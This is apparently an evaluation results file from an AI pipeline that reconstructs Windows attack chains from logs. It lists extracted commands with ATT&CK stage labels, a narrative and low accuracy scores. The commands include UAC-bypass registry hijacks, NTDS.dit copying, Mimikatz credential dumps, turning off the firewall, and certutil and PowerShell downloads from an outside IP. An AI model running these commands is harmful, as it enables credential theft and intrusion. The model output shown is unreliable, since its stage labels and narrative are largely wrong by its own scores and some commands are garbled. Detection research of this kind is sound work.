@@ -1,0 +1,228 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\\\Windows\\\\System32\\\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force Start-Process \"C:\\Windows\\System32\\fodhelper.exe}\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe' New-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\" Start-Process -FilePath $env:windir\\system32\\sdclt.exe Start-Sleep -s 3}\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\\\\\\\Program Files\\\\(x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe --no-startup-window /prefetch:5",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\\\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\\B.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "dllhost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '{New-Item HKCU:\\software\\classes\\ms-settings\\shell\\open\\command -Force New-ItemProperty HKCU:\\software\\classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -Value -Force Set-ItemProperty HKCU:\\software\\classes\\ms-settings\\shell\\open\\command -Name (default) -Value C:\\Windows\\System32\\cmd.exe -Force Start-Process C:\\Windows\\System32\\fodhelper.exe}'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '\"{New-Item -Force -Path HKCU:\\Software\\Classes\\Folder\\shell\\open\\command -Value cmd.exe /c notepad.exe New-ItemProperty -Force -Path HKCU:\\Software\\Classes\\Folder\\shell\\open\\command -Name DelegateExecute Start-Process -FilePath $Env:Windir\\system32\\sdclt.exe Start-Sleep -s 3}",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '{Set-itemproperty HKCU:\\software\\classes\\ms-settings\\shell\\open\\command -name delegateexecute -value }'",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '\"{Set-itemproperty HKCU:\\software\\classes\\ms-settings\\shell\\open\\command -name (default) -value C:\\Windows\\system32\\cmd.exe} ' ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "dllhost.exe /Processid:{338B40F9-9D68-4B53-A793-6B9AA0C5F63B}",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "ESentUTL.EXE /Y /VSS C:\\\\Windows\\\\NTDS\\\\Ntds.DIT /D C:\\\\NTDS\\\\Ntds.DIT",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '\"start-process -windowstyle hidden -filepath C:\\\\windows\\\\system32\\\\cmd.exe -argumentlist \"/c echo test > test.exe\"'",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c start-process -WindowStyle Hidden -filePath C:\\\\windows\\\\system32\\\\cmd.exe -ArgumentList '/c rundll32.exe user32.dll, LockWorkstation'",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "netsh advfirewall show allprofiles && netsh advfirewall set allprofiles state off && echo&&pause",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "taskkill /f /im wordpad.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "SangForCat.exe -v -server=https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest http://124.223.85.207:8082/test.hta -method post-usebasicparsing-contentType application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"import-module .\\invoke-psimage.ps1 invoke-psimage -Script .\\invoke-mimikatz.ps1-Out .\\EvilKiwi.png-image .\\995647.Jpg\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "Mimikatz2.exe lsadump:sam Exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "Powershell.exe -ExecutionPolicy Bypass -C \"copy-item '.\\Msxsl.exe' 'C:\\WINDOWS\\TEMP\\MSXLexe';Invoke-atomicTets t1220-testnumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \"hklm:\\software\\microsoft\\windows nt\\currentversion\\image file execution options\\osk.exe\" /v debugger/f\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg.exe delete hklm:\\software\\microsoft\\windows nt\\currentversion\\image file execution options\\osk.exe /v debugger /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "(NetSH ADVFireWall Show AllProfiles And NetSH ADVFireWall Set AllProfiles State Off) & Echo & Pause",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=\ufffd\ufffd2020-10-10 12:12:12\ufffd\ufffd\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /C del /f /q timestomp",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C runas /savecred /user:administrator \"powershell.exe -ExecutionPolicy Bypass -C \"\\127.0.0.1\\Invoke-WebReqest http:\\/\\/124.223.85.207:8082\\/Test\\.hta -Method 'POST'-UseBasicParsing -ContentType \"application\\/json\"\",",
+        "stage": "Collection"
+      },
+      {
+        "command": "mimikatz.exe LSADUMP::DCSync exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net.exe localgroup",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\windows\\temp\\msxsl.exe';Invoke-AtomicTest T1220 -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "rpexec windows/service/control patchtager service stop",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "taskkill /f /im winlogon.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "C:\\\\Windows\\\\System32\\\\cleanmgr.exe /autoclean /d c:",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"call (dir '\\\\127.0.0.1\\Invoke-PowerShellTcpReverse.scr\")",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"\\127.0.0.1\\Invoke-PowerShellTcpReverse.scr\",",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "tor.lnk",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"\\127.0.0.1\\Invoke-PowerShellTcpReverse.scr\",",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "An attacker began by accessing the system through a Tor link, then used DLL hosting to execute PowerShell scripts. They performed elevated privilege deployment via Office macros and ran Mimikatz tools to intercept password hashes. Later, they executed commands remotely and performed additional persistence via scheduled tasks and setting up reverse shells.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 96545,
+      "completion_tokens": 6519,
+      "total_tokens": 103064,
+      "wall_clock_s": 95.038,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.022727272727272728,
+      "recall": 0.045454545454545456,
+      "f1": 0.030303030303030307,
+      "tp": 1,
+      "fp": 43,
+      "fn": 21
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 44,
+      "fn": 23,
+      "recall_partial": 0.043478260869565216
+    },
+    "hallucination_rate": 0.3076923076923077,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 96545,
+      "completion_tokens": 6519,
+      "total_tokens": 103064,
+      "wall_clock_s": 95.038,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
